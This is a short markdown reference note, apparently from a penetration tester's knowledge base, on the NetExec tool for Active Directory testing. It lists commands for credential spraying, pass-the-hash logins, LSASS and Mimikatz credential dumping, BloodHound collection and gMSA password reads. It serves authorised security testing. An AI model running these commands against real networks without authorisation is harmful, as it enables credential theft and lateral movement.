---
tags: [tool, activedirectory, smb]
tool: "netexec"
category: "Active Directory"
installed: true
phase: [enumeration, exploitation]
---

# NetExec - Network Execution (CrackMapExec Fork)

## Tool Overview
Purpose: Swiss Army knife for AD pentesting
Location: ~/.local/bin/netexec

## When to Use
- Pass-the-hash attacks
- Credential spraying
- Module-based exploitation
- Enumeration across subnets

## How to Use It

SMB Enumeration:
netexec smb 192.168.1.0/24 -u user -p pass
netexec smb 192.168.1.0/24 -u user -H hash

Credential Spraying:
netexec smb 192.168.1.0/24 -u users.txt -p pass.txt

Module Examples:
netexec smb target -u user -p pass -M lsassy
netexec smb target -u user -p pass -M mimikatz
netexec smb target -u user -p pass -M bloodhound

Ldap Enumeration:
netexec ldap dc.domain.local -u user -p pass --gmsa

## Common Modules
- lsassy: LSASS dumping
- mimikatz: Mimikatz execution
- bloodhound: BloodHound data collection
- rdp: RDP login checker
- wmi: WMI execution

## Related Tools
crackmapexec, impacket
